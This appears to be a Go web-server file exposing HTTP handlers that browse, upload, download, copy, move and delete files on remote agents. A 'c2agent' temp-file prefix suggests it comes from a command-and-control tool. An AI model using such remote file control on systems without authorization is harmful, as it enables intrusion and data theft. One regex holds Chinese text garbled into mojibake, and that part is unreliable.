package web

import (
	"io"
	"mime"
	"net/http"
	"os"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
)

var listRe = regexp.MustCompile(`^(DIR|FILE)\s+(\d+)\s+(.+)$`)

func parseListing(text string) []map[string]any {
	items := make([]map[string]any, 0)
	for _, line := range strings.Split(text, "\n") {
		line = strings.TrimSpace(line)
		m := listRe.FindStringSubmatch(line)
		if m == nil {
			continue
		}
		size, err := strconv.ParseInt(m[2], 10, 64)
		if err != nil {
			size = 0
		}
		items = append(items, map[string]any{"name": m[3], "is_dir": m[1] == "DIR", "size": size})
	}
	return items
}

func (s *Server) handleFileCwd(w http.ResponseWriter, r *http.Request) {
	out, err := s.eng.RunAction(r.URL.Query().Get("agent_id"), "get_cwd", nil)
	if err != nil {
		writeJSON(w, 503, map[string]any{"error": err.Error()})
		return
	}
	path := strings.TrimSpace(out)
	if path == "" || strings.HasPrefix(path, "Error:") {
		writeJSON(w, 200, map[string]any{"path": ""})
		return
	}
	writeJSON(w, 200, map[string]any{"path": path})
}

func (s *Server) handleFileList(w http.ResponseWriter, r *http.Request) {
	agentID := r.URL.Query().Get("agent_id")
	path := r.URL.Query().Get("path")
	if path == "" {
		path = "."
	}
	out, err := s.eng.RunAction(agentID, "list_dir", map[string]any{"path": path})
	if err != nil {
		writeJSON(w, 503, map[string]any{"error": err.Error()})
		return
	}
	if msg, bad := listingError(out); bad {
		writeJSON(w, 200, map[string]any{"path": path, "error": msg})
		return
	}
	writeJSON(w, 200, map[string]any{"path": path, "items": parseListing(out), "raw": out})
}

// listingErrorRE matches the native agents' wording ("Error: ...", "Path does
// not exist", "... is a file") plus common shell/OS errors (bash, cmd.exe,
// PowerShell, including the Chinese localizations), so a failed listing is not
// silently rendered as an empty directory.
var listingErrorRE = regexp.MustCompile(`(?i)(^error\b|^path does not exist| is a file\b|` +
	`cannot find path|does not exist|no such file|cannot access|access is denied|` +
	`is not a directory|not recognized|涓嶆槸鍐呴儴鎴栧閮ㄥ懡浠绯荤粺鎵句笉鍒版寚瀹氱殑璺緞|鎷掔粷璁块棶)`)

// listingError reports a business error returned by the agent's list_dir.
func listingError(out string) (string, bool) {
	t := strings.TrimSpace(out)
	if listingErrorRE.MatchString(t) {
		return t, true
	}
	return "", false
}

func (s *Server) fileAction(w http.ResponseWriter, r *http.Request, action string, keys ...string) {
	var req map[string]any
	if err := readJSON(r, &req); err != nil {
		writeJSON(w, 400, map[string]any{"error": err.Error()})
		return
	}
	params := map[string]any{}
	agentID := ""
	if v, ok := req["agent_id"].(string); ok {
		agentID = v
	}
	for _, k := range keys {
		params[k] = req[k]
	}
	out, err := s.eng.RunAction(agentID, action, params)
	if err != nil {
		writeJSON(w, 503, map[string]any{"error": err.Error()})
		return
	}
	writeJSON(w, 200, map[string]any{"result": out})
}

func (s *Server) handleFileMkdir(w http.ResponseWriter, r *http.Request) {
	s.fileAction(w, r, "make_dir", "path")
}
func (s *Server) handleFileNew(w http.ResponseWriter, r *http.Request) {
	s.fileAction(w, r, "create_file", "path")
}
func (s *Server) handleFileDelete(w http.ResponseWriter, r *http.Request) {
	var req map[string]any
	if err := readJSON(r, &req); err != nil {
		writeJSON(w, 400, map[string]any{"error": err.Error()})
		return
	}
	action := "delete_file"
	if b, ok := req["is_dir"].(bool); ok && b {
		action = "delete_dir"
	}
	agentID, _ := req["agent_id"].(string)
	out, err := s.eng.RunAction(agentID, action, map[string]any{"path": req["path"]})
	if err != nil {
		writeJSON(w, 503, map[string]any{"error": err.Error()})
		return
	}
	writeJSON(w, 200, map[string]any{"result": out})
}
func (s *Server) handleFileCopy(w http.ResponseWriter, r *http.Request) {
	s.fileAction(w, r, "copy", "src", "dest")
}
func (s *Server) handleFileMove(w http.ResponseWriter, r *http.Request) {
	s.fileAction(w, r, "move", "src", "dest")
}

func (s *Server) handleFileDownload(w http.ResponseWriter, r *http.Request) {
	agentID := r.URL.Query().Get("agent_id")
	src := r.URL.Query().Get("path")
	if src == "" {
		writeJSON(w, 400, map[string]any{"error": "path required"})
		return
	}
	dest, err := s.eng.Download(agentID, src, "")
	if err != nil {
		writeJSON(w, 503, map[string]any{"error": err.Error()})
		return
	}
	if info, serr := os.Stat(dest); serr != nil || !info.Mode().IsRegular() {
		writeJSON(w, 500, map[string]any{"error": "downloaded file unavailable"})
		return
	}
	w.Header().Set("Content-Disposition", mime.FormatMediaType("attachment", map[string]string{"filename": filepath.Base(dest)}))
	http.ServeFile(w, r, dest)
}

func (s *Server) handleFileUpload(w http.ResponseWriter, r *http.Request) {
	r.Body = http.MaxBytesReader(w, r.Body, 64<<20)
	if err := r.ParseMultipartForm(8 << 20); err != nil {
		writeJSON(w, 400, map[string]any{"error": err.Error()})
		return
	}
	agentID := r.FormValue("agent_id")
	destPath := r.FormValue("dest")
	file, header, err := r.FormFile("file")
	if err != nil {
		writeJSON(w, 400, map[string]any{"error": err.Error()})
		return
	}
	defer file.Close()

	ulDir, err := s.cfg.UlDir()
	if err != nil {
		writeJSON(w, 500, map[string]any{"error": err.Error()})
		return
	}
	tmp, err := os.CreateTemp(ulDir, "c2agent-upload-*")
	if err != nil {
		writeJSON(w, 500, map[string]any{"error": err.Error()})
		return
	}
	tmpName := tmp.Name()
	defer os.Remove(tmpName)
	if _, err := io.Copy(tmp, file); err != nil {
		tmp.Close()
		writeJSON(w, 500, map[string]any{"error": err.Error()})
		return
	}
	tmp.Close()

	if destPath == "" {
		destPath = header.Filename
	}
	out, err := s.eng.Upload(agentID, tmpName, destPath)
	if err != nil {
		writeJSON(w, 503, map[string]any{"error": err.Error()})
		return
	}
	writeJSON(w, 200, map[string]any{"result": out})
}
